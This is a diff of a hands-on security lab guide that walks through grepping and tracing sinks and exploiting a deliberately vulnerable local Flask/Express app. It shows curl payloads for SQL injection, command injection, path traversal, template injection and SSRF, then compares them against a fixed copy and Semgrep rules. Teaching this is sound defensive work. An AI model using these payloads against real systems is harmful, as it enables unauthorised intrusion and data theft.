@@ -1,8 +1,9 @@
 # GUIDE: grep → trace → pwn
 
 Work through this with the apps running (see [README](README.md)). Pick Flask or Express,
-the bugs are identical. Commands below show Flask on `:5000`. Swap `5000` → `3000` and
-`.py` → `.js` for Express.
+the bugs are identical. Commands below show the vulnerable Flask app on `:5001`. Swap
+`5001` → `3000` and `.py` → `.js` for Express. The *fixed* copies sit on `:5002` / `:3002`,
+you'll use them in step 4.
 
 Have [SINKS.md](SINKS.md) open in another tab.
 
@@ -13,7 +14,7 @@ Have [SINKS.md](SINKS.md) open in another tab.
 Don't read the code yet. Look at the attack surface.
 
 ```bash
-curl -s http://localhost:5000/
+curl -s http://localhost:5001/
 ```
 
 Six routes, each takes a query param. Six potential **sources**. Write them down:
@@ -164,13 +165,13 @@ after you've done at least one by hand.
 Probe: does a quote break it?
 
 ```bash
-curl -s "http://localhost:5000/user?id=1'"
+curl -s "http://localhost:5001/user?id=1'"
 ```
 
 500 error → the quote reached SQL. Now extract something:
 
 ```bash
-curl -s "http://localhost:5000/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
+curl -s "http://localhost:5001/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
 ```
 
 You should see `FLAG{sqli_union_select_works}`. **Pwned.**
@@ -178,7 +179,7 @@ You should see `FLAG{sqli_union_select_works}`. **Pwned.**
 Now try the same against the decoy:
 
 ```bash
-curl -s "http://localhost:5000/order?id=1%20UNION%20SELECT%201,2,3"
+curl -s "http://localhost:5001/order?id=1%20UNION%20SELECT%201,2,3"
 ```
 
 Flask: 500 from `int()`. Express: 200, but `parseInt("1 UNION...")` silently returns `1`, so
@@ -190,19 +191,19 @@ sanitizer looks like from the outside, a crash or a clean answer, never your pay
 Probe:
 
 ```bash
-curl -s "http://localhost:5000/ping?host=127.0.0.1%3Bid"
+curl -s "http://localhost:5001/ping?host=127.0.0.1%3Bid"
 ```
 
 Output of `id` after the ping → shell metachar survived. Escalate:
 
 ```bash
-curl -s "http://localhost:5000/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt"
+curl -s "http://localhost:5001/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt"
 ```
 
 ### Flow 3: Path traversal
 
 ```bash
-curl -s "http://localhost:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
+curl -s "http://localhost:5001/docs?name=..%2F..%2Fsecret%2Fflag.txt"
 ```
 
 `DOCS_DIR` is `/app/flask_app/docs`. Two `..` gets you to `/app`. Try `/etc/passwd` too.
@@ -212,7 +213,7 @@ curl -s "http://localhost:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
 Probe. If it renders `49`, the template engine evaluated your input:
 
 ```bash
-curl -s "http://localhost:5000/hello?name={{7*7}}"
+curl -s "http://localhost:5001/hello?name={{7*7}}"
 ```
 
 Express uses EJS, different syntax, same bug:
@@ -231,7 +232,7 @@ The server fetches whatever URL you give it. Use it to reach something *you* can
 directly. The Express app is on the same container:
 
 ```bash
-curl -s "http://localhost:5000/fetch?url=http://127.0.0.1:3000/user?id=1"
+curl -s "http://localhost:5001/fetch?url=http://127.0.0.1:3000/user?id=1"
 ```
 
 In the real world this is cloud metadata (`http://169.254.169.254/`), internal admin panels,
@@ -270,6 +271,31 @@ Now `get_user` is safe for every caller forever. **Fix at the sink.** Same logic
 
 Do it, rerun your payloads, watch them die.
 
+### 4b. Compare with the fixed service
+
+You don't have to write the fixes to see them. `flask_app_fixed/` is the same app with every
+sink fixed at the sink, running on `:5002`. Same payload, two curls:
+
+```bash
+curl -s "http://localhost:5001/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
+curl -s "http://localhost:5002/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
+```
+
+Flag on the first, empty rows on the second. Now look at exactly what changed:
+
+```bash
+diff -u flask_app/db.py flask_app_fixed/db.py
+diff -u flask_app/utils.py flask_app_fixed/utils.py
+diff -u flask_app/app.py flask_app_fixed/app.py
+```
+
+Every hunk is a sanitizer, and every sanitizer matches its sink: `?` for SQL, an argument list
+for the shell, `realpath` + prefix check for the path, data-as-context for the template, a
+host allowlist for the URL. Nothing else moved.
+
+`./check.sh` runs both sides: on the vulnerable side PASS means the exploit worked, on the
+fixed side PASS means it was blocked.
+
 ---
 
 ## 5. AUTOMATE: let Semgrep grep+trace for you (5 min)
@@ -293,6 +319,23 @@ Look at `semgrep/flask.yml`. Two rules:
 > return values back into it. Only `/user` (→ `res.json`) escapes. Same fix: add the
 > wrappers, get all 5. Decoy skipped in both via `parseInt`.
 
+Now run the same rules on the fixed app:
+
+```bash
+docker run --rm -v "$PWD:/src" semgrep/semgrep semgrep scan --config /src/semgrep/flask.yml /src/flask_app_fixed
+```
+
+The builtin rule is quiet: the rule names `safe_url` and `safe_path` as sanitizers, the
+template sink only counts its *template* argument, and `cursor.execute(sql, params)` gets a
+constant. The wrapper rule still flags every route that calls a wrapper (`/user`, `/ping`,
+`/docs`, `/order`), because we told it those wrappers are sinks and never told it the fix made
+that false. Keep your sink list honest both ways.
+
+> **Express**: the builtin rule keeps firing on the fixed app too, for `/ping`, `/docs` and
+> `/fetch`. `res.send` is a sink, and the *output* of `runCmd` / `readDoc` / `fetch` is still
+> derived from user input, so taint flows through. Those are false positives: the dangerous
+> call is gone, the echo isn't. Step 3 exists for exactly this reason.
+
 That's the lesson. **Tools are only as good as your sink list.** You did step 1 (grep the
 wrappers) so you could teach the tool. CodeQL does cross-function tracing out of the box but
 costs a build step. Both give *candidates*. Step 3 is still yours.
@@ -313,3 +356,27 @@ Then go find a real codebase you already know. Run the grep from SINKS.md. Every
 **where does this come from?**
 
 That's the whole job.
+
+---
+
+## 7. CLEAN UP
+
+You're running a container with five remote-code-execution bugs in it. Don't leave it up.
+
+```bash
+docker stop gtp
+```
+
+`--rm` on the run command removes the container when it stops. Check nothing is left:
+
+```bash
+docker ps
+```
+
+To free the disk space too:
+
+```bash
+docker rmi ghcr.io/sdqmd/grep-trace-pwn
+```
+
+If you forgot `--name gtp`, `docker ps` shows the container id; `docker stop <id>`.
